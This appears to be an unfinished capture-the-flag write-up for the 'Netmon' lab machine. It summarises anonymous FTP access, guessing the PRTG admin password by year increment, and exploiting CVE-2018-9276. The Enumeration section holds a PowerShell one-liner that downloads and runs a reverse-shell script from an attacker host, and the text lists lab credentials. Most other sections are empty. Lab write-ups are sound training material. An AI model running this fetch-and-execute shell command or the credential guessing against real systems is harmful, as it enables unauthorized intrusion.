Name & IP Address of Machine:
> NETMON : `10.10.10.152`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

pentest:P3nT3st

## Synopsis
Anonymous ftp allowed and login anonymously, you will get user.txt. There is also a backup file for web server database. From which you get a old password of previous year. You guess the password by incrementing year and login to the webserver. The web server is running as nt/ authority system, search google for any cve and you will come across `CVE-2018-9276`. Use that to get a reverse shell using msfconsole or whatever way you like.
`prtgadmin:PrTg@dmin2018`
`prtgadmin:PrTg@dmin2019` --- works
 

## Enumeration
Opened Ports: 
- [ ] 21 (FTP)
- [ ] 80 (WEB-SERVER)

powershell iex(new-object net.webclient).downloadString('http://10.10.14.28:8000/Invoke-PowerShellTcp.ps1)



## FootHold

## Lateral Movement

## Privilege Escalation




<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->